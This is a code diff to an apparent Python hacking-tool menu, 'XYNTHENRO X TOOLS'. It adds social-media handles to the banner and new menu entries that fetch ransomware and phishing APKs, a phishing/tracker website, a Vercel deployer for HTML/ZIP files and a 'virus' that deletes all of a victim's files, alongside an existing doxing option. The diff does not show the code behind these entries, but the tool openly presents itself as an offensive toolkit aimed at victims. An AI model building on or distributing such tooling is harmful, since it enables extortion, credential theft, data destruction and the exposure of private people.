@@ -67,6 +67,8 @@ def run_banner():
 {Wh}--------------------------------
    {Wh}| {Gr}XYNTHENRO X TOOLS {Wh}|
    {Wh}|       {Gr}@CODE BY NEXULTZY-404      {Wh}|
+   {Wh}|       {Gr} TIKTOK : @NexulTzy    {Wh}|
+   {Wh}|       {Gr} TELEGRAM : @NexulTzy    {Wh}|
 {Wh}--------------------------------⠀    
 """)
     time.sleep(0.2)
@@ -782,7 +784,11 @@ options = [
     {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
     {'num': 5, 'text': 'WordPress Security Check (safe)', 'func': wp_security_menu},
     {'num': 6, 'text': 'Multi Doxing Intelligence (NEXULTZY)', 'func': multi_dox_menu},
-    {'num': 7, 'text': 'Private Menu', 'func': KHUSUS_NEXULTZY},   # ✅ diarahkan ke options2
+    {'num': 7, 'text': 'GET APK RANSOMWARE', 'func': GetRansom},
+    {'num': 8, 'text': 'GET APK PHISING', 'func': GetPhising},
+    {'num': 9, 'text': 'GET WEB PHISING/TRACKER', 'func': GetWebPhising},
+    {'num': 10, 'text': 'DEPLOY FILE HTML/ZIP', 'func': deploy_zip_to_vercel},
+    {'num': 11, 'text': 'GET VIRUS HAPUS ALL FILE KORBAN', 'func': GetVirus},
     {'num': 0, 'text': 'Exit', 'func': exit}
 ]
 
